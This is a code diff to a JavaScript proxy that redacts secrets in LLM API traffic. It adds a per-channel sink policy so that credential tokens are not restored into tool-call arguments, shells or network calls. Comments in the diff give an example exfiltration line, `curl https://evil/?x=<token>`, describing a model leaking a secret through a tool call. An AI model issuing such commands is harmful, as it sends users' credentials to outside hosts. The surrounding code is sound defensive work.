@@ -224,158 +224,145 @@ export function classifyOwnership(value, ctx, registry = null) {
   return { ownership: TOKEN_OWNERSHIP.UNKNOWN, namespace: null, token };
 }
 
-export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" }, registry = null }) {
-  if (typeof text !== "string") throw new TypeError("classifyRestore requires text");
-  const sensitive = SENSITIVE_SINK_KINDS.includes(sink.kind);
-  const trusted = isTrustedSink(sink);
-  let known = 0;
-  const unknownTokens = [];
+// ------------------------------------------------------------ sink policy -------
+//
+// The channel decides the policy BEFORE any token is resolved, which is what makes this
+// work for a stream: a tool-argument delta arrives fragmented, so a per-token decision
+// could not be taken until the token were complete, by which point part of it may already
+// have been emitted.
+//
+// A generic tool argument does NOT restore. If it did, any tool the model can call would
+// be a way to move a credential outside the restoration boundary -- the model writes
+// `curl https://evil/?x=<token>` into a tool call and the gateway hands over the secret.
 
-  // Foreign tokens do NOT match our dialect, so REDACTED_TOKEN cannot find them.
-  // They must be located through the registered namespaces themselves.
-  if (registry) {
-    for (const ns of registry.namespaces) {
-      ns.matcher.lastIndex = 0;
-      const found = text.match(ns.matcher);
-      if (!found) continue;
-      for (const candidate of found) {
-        if (registry.tokens.has(candidate)) continue; // exact entries are handled below
-        if (!isRegisteredTokenLike(candidate)) continue;
-        const { ownership } = classifyOwnership(candidate, ctx, registry);
-        if (ownership !== TOKEN_OWNERSHIP.FOREIGN_REGISTERED) continue;
-        if (sensitive && !trusted) {
-          return {
-            action: RESTORE_ACTION.BLOCK,
-            text,
-            blockedTokens: [candidate],
-            unknownTokens: [],
-            telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace: ns.name, ownership },
-          };
-        }
-      }
-    }
-    // Exact registrations that no prefix namespace covers.
-    for (const token of registry.tokens) {
-      if (!text.includes(token)) continue;
-      if (sensitive && !trusted) {
-        return {
-          action: RESTORE_ACTION.BLOCK,
-          text,
-          blockedTokens: [token],
-          unknownTokens: [],
-          telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace: "exact", ownership: TOKEN_OWNERSHIP.FOREIGN_REGISTERED },
-        };
-      }
-    }
-  }
+export const SINK_KIND = Object.freeze({
+  ASSISTANT_TEXT: "assistant_text",
+  TOOL_ARGUMENT: "tool_argument",
+  SHELL: "shell",
+  NETWORK_EGRESS: "network_egress",
+  DATABASE: "database",
+  EMAIL: "email",
+});
 
-  // A representation-constrained surrogate runs through EXACTLY the same policy as a
-  // bare token. It is resolved to its underlying token first (see resolveSurrogate /
-  // classifyOwnership below) rather than being handled by a shortcut branch here: a
-  // shortcut would drift the moment entityClassFor starts returning real classes, and
-  // an INFRA entity would then be treated differently depending on whether its
-  // replacement happened to be base64.
-  const visibleSurrogates = ctx && ctx.ledger
-    ? ctx.ledger.entries().map((e) => e.visible).filter((visible) => text.includes(visible))
-    : [];
-  const surrogateNote = visibleSurrogates.length
-    ? { surrogates: visibleSurrogates, encodingKinds: visibleSurrogates.map((v) => ctx.ledger.lookup(v)?.encodingKind) }
-    : {};
+export const SINK_MODE = Object.freeze({
+  RESTORE: "restore",   // known tokens resolved, unknown ones left alone
+  PRESERVE: "preserve", // tokens kept verbatim; nothing resolved
+  BLOCK: "block",       // sensitive sink: a credential must not be substituted
+});
 
-  // A surrogate is not matched by REDACTED_TOKEN (it is base64, not CRG-shaped), so it
-  // is walked explicitly -- but through the SAME ownership and entity logic.
-  for (const visible of visibleSurrogates) {
-    const { ownership, namespace, token } = classifyOwnership(visible, ctx, registry);
-    if (ownership === TOKEN_OWNERSHIP.UNKNOWN) continue;
-    if (sensitive && !trusted && ownership === TOKEN_OWNERSHIP.OWN
-      && requiresSinkProtection(ctx.entityClassFor?.(token))) {
-      return {
-        action: RESTORE_ACTION.BLOCK,
-        text,
-        blockedTokens: [visible],
-        unknownTokens: [],
-        telemetry: { event: "restore_blocked_untrusted_sink", sink: sink.kind, tokenShape: "surrogate", ...surrogateNote },
-      };
-    }
-    if (sensitive && !trusted && ownership === TOKEN_OWNERSHIP.FOREIGN_REGISTERED) {
-      return {
-        action: RESTORE_ACTION.BLOCK,
-        text,
-        blockedTokens: [visible],
-        unknownTokens: [],
-        telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace, ownership, tokenShape: "surrogate", ...surrogateNote },
-      };
-    }
-  }
+// Sinks that carry a VALUE TO BE USED rather than text to be read. An unresolvable token
+// in one of these is refused: forwarding it hands a tool an operand it cannot use either.
+// Inert channels (prose, a log line) keep it, because there it is only text.
+const OPERAND_SINKS = Object.freeze([SINK_KIND.TOOL_ARGUMENT]);
 
+/** Resolve the policy for a channel. `trusted` names sinks that handle secrets locally. */
+export function resolveSinkMode({ kind = SINK_KIND.ASSISTANT_TEXT, toolName = null, trust = null } = {}, trusted = null) {
+  const trustedNames = trusted instanceof Set ? trusted : new Set(trusted || []);
+  // Two ways to declare trust: the sink says so itself, or the deployment names it. An
+  // undeclared sink is untrusted, because guessing "trusted" fails open.
+  if (trust === "trusted") return { mode: SINK_MODE.RESTORE, kind, trusted: true };
+  if (toolName && trustedNames.has(toolName)) return { mode: SINK_MODE.RESTORE, kind, trusted: true };
+  if (kind === SINK_KIND.ASSISTANT_TEXT) return { mode: SINK_MODE.RESTORE, kind, trusted: false };
+  if (SENSITIVE_SINK_KINDS.includes(kind)) return { mode: SINK_MODE.BLOCK, kind, trusted: false };
+  // Everything else -- a generic tool argument, a log write, an unknown channel -- keeps
+  // the token. Fail closed for anything we cannot vouch for.
+  return { mode: SINK_MODE.PRESERVE, kind, trusted: false };
+}
+
+/** True when a token this request never minted appears in the text. */
+function hasUnknownProtectedToken(text, ctx) {
   for (const token of text.match(REDACTED_TOKEN) || []) {
-    const { ownership, namespace } = classifyOwnership(token, ctx, registry);
+    if (!ctx.tokenToRaw.has(token)) return true;
+  }
+  return false;
+}
 
-    if (ownership === TOKEN_OWNERSHIP.FOREIGN_REGISTERED) {
-      // This layer never restores a foreign token: it does not own the mapping.
-      // An outer DLP may restore it further down the chain. In a sensitive sink
-      // it must be blocked, because the outer layer may be exactly where the
-      // plaintext gets substituted before egress.
-      if (sensitive && !trusted) {
-        return {
-          action: RESTORE_ACTION.BLOCK,
-          text,
-          blockedTokens: [token],
-          unknownTokens: [],
-          telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace, ownership },
-        };
-      }
-      continue;
-    }
+export const BLOCKED_OPERAND = "[blocked: unresolved token]";
 
-    if (ownership === TOKEN_OWNERSHIP.OWN) {
-      known += 1;
-      // Ownership is necessary but not sufficient: a credential restored into an
-      // untrusted sensitive sink is an egress channel, because the model can emit
-      // `curl https://evil.example/?x=<token>` and have this layer hand over the
-      // plaintext.
-      if (sensitive && !trusted && requiresSinkProtection(ctx.entityClassFor?.(token))) {
-        return {
-          action: RESTORE_ACTION.BLOCK,
-          text,
-          blockedTokens: [token],
-          unknownTokens: [],
-          telemetry: {
-            event: "restore_blocked_untrusted_sink",
-            sink: sink.kind,
-            tokenShape: "registered",
-            reason: "credential-into-untrusted-sink",
-          },
-        };
-      }
-      continue;
+/**
+ * Apply the channel policy to one string.
+ * @returns {{text: string, mode: string, blocked: boolean}}
+ */
+export function applySinkPolicy(text, ctx, sink = {}, trusted = null) {
+  const { mode } = resolveSinkMode(sink, trusted);
+  if (mode === SINK_MODE.PRESERVE) {
+    // A generic operand keeps its token. An UNKNOWN one is refused, because the tool
+    // cannot resolve it either -- but only in an operand channel: a log line or other
+    // inert text keeps it, since there it is just text and refusing would break ordinary
+    // responses.
+    if (OPERAND_SINKS.includes(sink.kind) && hasUnknownProtectedToken(text, ctx)) {
+      return { text: BLOCKED_OPERAND, mode, blocked: true };
     }
+    return { text, mode, blocked: false };
+  }
+  if (mode === SINK_MODE.BLOCK) {
+    // Sensitive sink: an unresolvable operand is refused rather than forwarded, because a
+    // shell, an egress call, a database or an email would receive a token it cannot use.
+    if (hasUnknownProtectedToken(text, ctx)) return { text: BLOCKED_OPERAND, mode, blocked: true };
+    return { text, mode, blocked: false };
+  }
+  return { text: ctx.restoreText(text), mode, blocked: false };
+}
 
-    // UNKNOWN: a token-like string nobody claims.
-    if (!isProtectedTokenLike(token)) continue;
-    if (sensitive) {
-      return {
-        action: RESTORE_ACTION.BLOCK,
-        text,
-        blockedTokens: [token],
-        unknownTokens: [token],
-        telemetry: { event: "restore_miss_blocked", sink: sink.kind, tokenShape: "protected" },
-      };
-    }
-    if (!unknownTokens.includes(token)) unknownTokens.push(token);
+export function classifyRestore({ ctx, text, sink = { kind: SINK_KIND.ASSISTANT_TEXT }, registry = null, trusted = null }) {
+  if (typeof text !== "string") throw new TypeError("classifyRestore requires text");
+  // Delegates to applySinkPolicy so there is exactly ONE implementation of the channel
+  // policy. The two used to be separate copies, which drifted the moment a generic tool
+  // argument had to stop restoring: the helper looked correct while the response path
+  // stayed unsafe.
+  const { mode } = resolveSinkMode(sink, trusted);
+  const unknownTokens = [];
+  for (const token of text.match(REDACTED_TOKEN) || []) {
+    if (ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token)) continue;
+    if (isProtectedTokenLike(token) && !unknownTokens.includes(token)) unknownTokens.push(token);
   }
 
-  const output = ctx && typeof ctx.restoreText === "function" ? ctx.restoreText(text) : text;
+  const applied = ctx
+    ? applySinkPolicy(text, ctx, sink, trusted)
+    : { text, mode, blocked: false };
+
+  if (applied.blocked) {
+    return {
+      action: RESTORE_ACTION.BLOCK,
+      text: applied.text,
+      blockedTokens: unknownTokens,
+      unknownTokens,
+      registry,
+      mode,
+      telemetry: {
+        event: mode === SINK_MODE.BLOCK ? "restore_blocked_untrusted_sink" : "restore_miss_blocked",
+        sink: sink.kind,
+        tokenShape: "protected",
+      },
+    };
+  }
+  // The action reports WHAT WAS DELIVERED, which is the only definition that cannot
+  // drift:
+  //   restore  -> tokens were resolved to plaintext
+  //   preserve -> the text was delivered unchanged (including a sensitive channel, where
+  //               the token is kept rather than substituted)
+  //   block    -> the content was replaced with a marker because it could not be resolved
+  //
+  // An earlier revision reported `block` for any sensitive channel, which conflated "the
+  // secret was not substituted" with "something was refused" and made the action name
+  // depend on policy rather than on the outcome.
+  // Derived from what the text became, not from the mode: a RESTORE channel that found
+  // nothing to resolve delivered the text unchanged, so the honest action is `preserve`,
+  // and the mode is reported separately to explain why.
+  const action = applied.text !== text ? RESTORE_ACTION.RESTORE : RESTORE_ACTION.PRESERVE;
   return {
-    action: RESTORE_ACTION.RESTORE,
-    text: output,
-    unknownTokens,
+    action,
+    text: applied.text,
     blockedTokens: [],
+    unknownTokens,
+    registry,
+    mode,
     telemetry: unknownTokens.length
-      ? { event: "restore_miss", sink: sink.kind, count: unknownTokens.length, knownCount: known }
-      : { event: "restore_ok", sink: sink.kind, count: known },
+      ? { event: "restore_miss", sink: sink.kind, count: unknownTokens.length }
+      : { event: "restore_ok", sink: sink.kind, count: action === RESTORE_ACTION.RESTORE ? 1 : 0 },
   };
 }
+
 const DEFAULT_MAX_BODY_BYTES = 16 * 1024 * 1024;
 const DEFAULT_MAX_REDACTIONS = 16384;
 const textEncoder = new TextEncoder();
@@ -2817,50 +2804,85 @@ function collectStringLeaves(value, basePath, channelPrefix, fields, local = [])
   }
 }
 
+// Each streaming field is tagged with the SINK it belongs to, because the same delta
+// envelope carries both prose and tool operands. Without the tag the stream layer would
+// resolve tokens in a tool argument exactly like it does in prose.
+function sinkForChatDeltaPath(path) {
+  return path.includes("tool_calls")
+    ? { kind: SINK_KIND.TOOL_ARGUMENT }
+    : { kind: SINK_KIND.ASSISTANT_TEXT };
+}
+
 function streamFields(data, eventName="") {
   const fields=[];
   if (Array.isArray(data?.choices)) {
     data.choices.forEach((choice, ci) => {
       if (choice?.delta && typeof choice.delta === "object") {
+        const before = fields.length;
         collectStringLeaves(choice.delta,["choices",ci,"delta"],`chat:${choice.index ?? ci}:delta`,fields);
+        for (let i = before; i < fields.length; i++) fields[i].sink = sinkForChatDeltaPath(fields[i].path);
+        // A tool-call argument delta is identified by its path, not its channel, so the
+        // tool name is only available on the first fragment.
+        const toolName = choice.delta?.tool_calls?.[0]?.function?.name;
+        if (toolName) for (let i = before; i < fields.length; i++) fields[i].sink.toolName = toolName;
       }
       // Some compatible providers use a legacy text delta.
-      if (typeof choice?.text === "string") fields.push({ path:["choices",ci,"text"], channel:`chat:${choice.index ?? ci}:text` });
+      if (typeof choice?.text === "string") fields.push({ path:["choices",ci,"text"], channel:`chat:${choice.index ?? ci}:text`, sink:{ kind: SINK_KIND.ASSISTANT_TEXT } });
     });
   }
   const typ = data?.type || eventName || "event";
+  // Anthropic: `input_json_delta` is a tool operand, `text_delta` is prose.
+  const anthropicTool = typ === "input_json_delta" || typ === "content_block_delta" && data?.delta?.type === "input_json_delta";
+  const sink = anthropicTool
+    ? { kind: SINK_KIND.TOOL_ARGUMENT }
+    : { kind: SINK_KIND.ASSISTANT_TEXT };
   if (typeof data?.delta === "string" && /delta/i.test(typ)) {
-    fields.push({ path:["delta"], channel:`responses:${typ}:${data.output_index ?? ""}:${data.content_index ?? ""}:${data.item_id ?? ""}` });
+    fields.push({ path:["delta"], channel:`responses:${typ}:${data.output_index ?? ""}:${data.content_index ?? ""}:${data.item_id ?? ""}`, sink:{ kind: SINK_KIND.ASSISTANT_TEXT } });
   } else if (data?.delta && typeof data.delta === "object") {
+    const before = fields.length;
     collectStringLeaves(data.delta,["delta"],`delta:${typ}:${data.index ?? ""}`,fields);
+    for (let i = before; i < fields.length; i++) fields[i].sink = sink;
   }
   return fields;
 }
 
-function restoreCompleteStrings(value, ctx, excluded = new Set(), path = []) {
-  if (typeof value === "string") return excluded.has(path.join(".")) ? value : ctx.restoreText(value);
+function restoreCompleteStrings(value, ctx, excluded = new Set(), path = [], trusted = null) {
+  // Non-delta strings are prose by default. They are NOT resolved blindly: a protocol
+  // adapter that resolved everything is what let tool operands through.
+  if (typeof value === "string") {
+    if (excluded.has(path.join("."))) return value;
+    return applySinkPolicy(value, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+  }
   if (Array.isArray(value)) { for (let i=0;i<value.length;i++) value[i]=restoreCompleteStrings(value[i],ctx,excluded,path.concat(String(i))); return value; }
   if (value && typeof value === "object") { for (const k of Object.keys(value)) value[k]=restoreCompleteStrings(value[k],ctx,excluded,path.concat(k)); }
   return value;
 }
 
 class SseRestorer {
-  constructor(ctx) { this.ctx=ctx; this.channels=new Map(); this.queue=[]; }
+  constructor(ctx, trusted = null) { this.ctx=ctx; this.trusted=trusted; this.channels=new Map(); this.queue=[]; }
   ingest(raw) {
     const parsed=parseSseEvent(raw);
     const payload=parsed.dataText;
     if (!payload || payload === "[DONE]") { this.queue.push({safe:true, output:raw+"\n\n"}); return this.drain(); }
     let data;
-    try { data=JSON.parse(payload); } catch { this.queue.push({safe:true, output:serializeSseEvent(parsed,this.ctx.restoreText(payload))}); return this.drain(); }
+    try { data=JSON.parse(payload); } catch {
+      // Unparseable event: treat it as prose rather than resolving tokens we cannot
+      // attribute to a channel.
+      const res=applySinkPolicy(payload,this.ctx,{kind:SINK_KIND.ASSISTANT_TEXT},this.trusted);
+      this.queue.push({safe:true, output:serializeSseEvent(parsed,res.text)}); return this.drain();
+    }
     const fields=streamFields(data, parsed.eventName);
     const excluded=new Set(fields.map((f)=>f.path.join(".")));
-    restoreCompleteStrings(data,this.ctx,excluded);
+    // Strings that are NOT delta channels are walked under the prose policy, not blindly.
+    restoreCompleteStrings(data,this.ctx,excluded,[]);
     const ev={safe:fields.length===0,pending:fields.length,parsed,data,output:null};
     this.queue.push(ev);
     const affected=new Set();
     for (const f of fields) {
       const parent=getAt(data,f.path), key=f.path[f.path.length-1], source=parent[key];
-      let ch=this.channels.get(f.channel); if (!ch) this.channels.set(f.channel,ch={text:"",records:[]});
+      let ch=this.channels.get(f.channel);
+      if (!ch) { ch={text:"",records:[],sink:f.sink || {kind:SINK_KIND.ASSISTANT_TEXT}}; this.channels.set(f.channel,ch); }
+      if (f.sink?.toolName && !ch.sink.toolName) ch.sink.toolName = f.sink.toolName;
       ch.text += source; ch.records.push({ev,parent,key}); affected.add(f.channel);
     }
     for (const key of affected) this.maybeFlushChannel(key,false);
@@ -2869,7 +2891,9 @@ class SseRestorer {
   maybeFlushChannel(key,force) {
     const ch=this.channels.get(key); if (!ch || !ch.records.length) return;
     if (!force && possibleTokenSuffixLength(ch.text)>0) return;
-    const restored=this.ctx.restoreText(ch.text);
+    // The CHANNEL's sink decides, so a fragmented tool argument is never resolved
+    // part-way through.
+    const restored=applySinkPolicy(ch.text,this.ctx,ch.sink,this.trusted).text;
     for (const r of ch.records) r.parent[r.key]="";
     const last=ch.records[ch.records.length-1]; last.parent[last.key]=restored;
     for (const r of ch.records) { r.ev.pending--; if (r.ev.pending===0) r.ev.safe=true; }
@@ -2888,11 +2912,93 @@ class SseRestorer {
   }
 }
 
-export function restoreSseStream(body, ctx) {
+// ------------------------------------------- protocol-aware response routing --------
+//
+// The response is walked BY PROTOCOL so each string is delivered under the right sink,
+// instead of restoreJson() recursing blindly and resolving every token it meets. A
+// protocol adapter must not call restoreText() on its own: that is how the policy was
+// bypassed before.
+
+/** Route a tool-call argument list on one OpenAI message/delta object. */
+function applyOpenAiToolCalls(toolCalls, ctx, trusted) {
+  if (!Array.isArray(toolCalls)) return;
+  for (const call of toolCalls) {
+    const fn = call?.function;
+    if (!fn || typeof fn.arguments !== "string") continue;
+    const res = applySinkPolicy(fn.arguments, ctx, { kind: SINK_KIND.TOOL_ARGUMENT, toolName: fn.name }, trusted);
+    fn.arguments = res.text;
+  }
+}
+
+/** Route one OpenAI chat choice (message or streaming delta). */
+function applyOpenAiChoice(choice, ctx, trusted) {
+  const node = choice?.message || choice?.delta;
+  if (!node) return;
+  if (typeof node.content === "string") {
+    node.content = applySinkPolicy(node.content, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+  }
+  applyOpenAiToolCalls(node.tool_calls, ctx, trusted);
+}
+
+/** Route one Anthropic content block list (non-stream response body). */
+function applyAnthropicContent(content, ctx, trusted) {
+  if (!Array.isArray(content)) return;
+  for (const block of content) {
+    if (!block || typeof block !== "object") continue;
+    if (block.type === "text" && typeof block.text === "string") {
+      block.text = applySinkPolicy(block.text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+    } else if (block.type === "tool_use" && block.input && typeof block.input === "object") {
+      // Tool inputs are structured, so each string leaf is an operand.
+      for (const key of Object.keys(block.input)) {
+        if (typeof block.input[key] !== "string") continue;
+        block.input[key] = applySinkPolicy(
+          block.input[key], ctx,
+          { kind: SINK_KIND.TOOL_ARGUMENT, toolName: block.name },
+          trusted
+        ).text;
+      }
+    }
+  }
+}
+
+/** Walk a parsed non-stream response and return it with the policy applied. */
+export function applyResponsePolicy(data, ctx, trusted = null) {
+  if (!data || typeof data !== "object") return data;
+  if (Array.isArray(data.choices)) {
+    for (const choice of data.choices) applyOpenAiChoice(choice, ctx, trusted);
+  }
+  if (Array.isArray(data.content)) applyAnthropicContent(data.content, ctx, trusted);
+  // OpenAI Responses API. `output_text` is the aggregate assistant text, so it restores
+  // like prose; the text parts and function_call arguments are handled separately below.
+  if (typeof data.output_text === "string") {
+    data.output_text = applySinkPolicy(data.output_text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+  }
+  if (Array.isArray(data.output)) {
+    for (const item of data.output) {
+      if (item?.type === "function_call" && typeof item.arguments === "string") {
+        item.arguments = applySinkPolicy(
+          item.arguments, ctx,
+          { kind: SINK_KIND.TOOL_ARGUMENT, toolName: item.name },
+          trusted
+        ).text;
+      }
+      if (Array.isArray(item?.content)) {
+        for (const part of item.content) {
+          if (part && typeof part.text === "string") {
+            part.text = applySinkPolicy(part.text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+          }
+        }
+      }
+    }
+  }
+  return data;
+}
+
+export function restoreSseStream(body, ctx, trusted = null) {
   const reader=body.getReader();
   const decoder=new TextDecoder();
   const encoder=new TextEncoder();
-  const restorer=new SseRestorer(ctx);
+  const restorer=new SseRestorer(ctx, trusted);
   let buffer="";
   let upstreamDone=false;
   let restorerFinished=false;
@@ -2947,7 +3053,7 @@ export function restoreSseStream(body, ctx) {
   });
 }
 
-async function restoreNonStreamResponse(upstreamResponse, ctx, corsOrigin) {
+async function restoreNonStreamResponse(upstreamResponse, ctx, corsOrigin, trusted = null) {
   const headers=withCors(upstreamResponse.headers,corsOrigin); headers.delete("content-encoding");
   if (!upstreamResponse.body || upstreamResponse.status===204 || upstreamResponse.status===304) return new Response(null,{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers});
   const ct=headers.get("content-type") || "";
@@ -2955,8 +3061,18 @@ async function restoreNonStreamResponse(upstreamResponse, ctx, corsOrigin) {
   const text=await upstreamResponse.text();
   let out=text;
   if (isJsonContentType(ct)) {
-    try { const data=JSON.parse(text); restoreJson(data,ctx); out=JSON.stringify(data); } catch { out=ctx.restoreText(text); }
-  } else out=ctx.restoreText(text);
+    try {
+      const data=JSON.parse(text);
+      // Protocol-aware: every string is delivered under the sink it belongs to, so a
+      // tool-call operand is not silently substituted.
+      applyResponsePolicy(data, ctx, trusted);
+      out=JSON.stringify(data);
+    } catch {
+      // Not JSON we can walk: treat the whole body as inert text rather than resolving
+      // tokens we cannot attribute to a channel.
+      out=applySinkPolicy(text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
+    }
+  } else out=applySinkPolicy(text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted).text;
   return new Response(out,{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers});
 }
 
@@ -2972,6 +3088,10 @@ export async function handleRequest(request, env = {}, options = {}) {
   if (!target) return jsonError(404,"Expected /<flags>$<upstream-url>");
   if (!allowedHost(target.upstream,env)) return jsonError(403,"Upstream host is not in REDACT_ALLOWED_HOSTS");
 
+  // Sinks that handle secrets locally. A tool the model can call is NOT trusted merely
+  // because it exists, so this has to be declared explicitly.
+  const trustedSinks = options.trustedSinks
+    || (env?.REDACT_TRUSTED_BROKERS ? String(env.REDACT_TRUSTED_BROKERS).split(",").map((x) => x.trim()).filter(Boolean) : null);
   const maxBody=intSetting(env?.REDACT_MAX_BODY_BYTES,DEFAULT_MAX_BODY_BYTES);
   const maxRedactions=intSetting(env?.REDACT_MAX_REDACTIONS,DEFAULT_MAX_REDACTIONS);
   const ctx=new RedactionContext({salt:options.salt || RUNTIME_SALT,maxRedactions});
@@ -3002,9 +3122,9 @@ export async function handleRequest(request, env = {}, options = {}) {
   const responseCt=upstreamResponse.headers.get("content-type") || "";
   if (/text\/event-stream/i.test(responseCt) && upstreamResponse.body) {
     const rh=withCors(upstreamResponse.headers,corsOrigin); rh.delete("content-length"); rh.delete("content-encoding");
-    return new Response(restoreSseStream(upstreamResponse.body,ctx),{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers:rh});
+    return new Response(restoreSseStream(upstreamResponse.body,ctx,trustedSinks),{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers:rh});
   }
-  return restoreNonStreamResponse(upstreamResponse,ctx,corsOrigin);
+  return restoreNonStreamResponse(upstreamResponse,ctx,corsOrigin,trustedSinks);
 }
 
 export default { fetch(request, env, ctx) { return handleRequest(request,env); } };
